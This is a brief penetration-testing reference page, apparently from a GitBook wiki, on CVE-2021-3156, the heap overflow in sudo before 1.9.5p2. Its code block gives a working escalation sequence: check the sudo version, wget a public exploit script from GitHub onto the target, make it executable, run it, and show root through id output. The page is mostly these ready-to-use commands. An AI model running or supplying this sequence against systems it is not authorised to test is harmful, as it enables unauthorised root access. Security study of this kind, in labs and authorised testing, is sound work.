---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Sudo

`sudo` < `1.9.5p2` is susceptible to a heap-based buffer overflow ([CVE-2021-3156](https://nvd.nist.gov/vuln/detail/cve-2021-3156)) and a [PoC](https://github.com/worawit/CVE-2021-3156/tree/main) is available.

{% code overflow="wrap" %}
```bash
# Check the target's sudo version
$ sudo --version
Sudo version 1.8.31

# Download the PoC to the target
$ wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py

# Assign execute permissions
$ chmod +x exploit_nss.py

# Run the exploit
$ ./exploit_nss.py
...
# id
uid=0(root) gid=0(root) groups=0(root),998(apache),1004(anita)
```
{% endcode %}
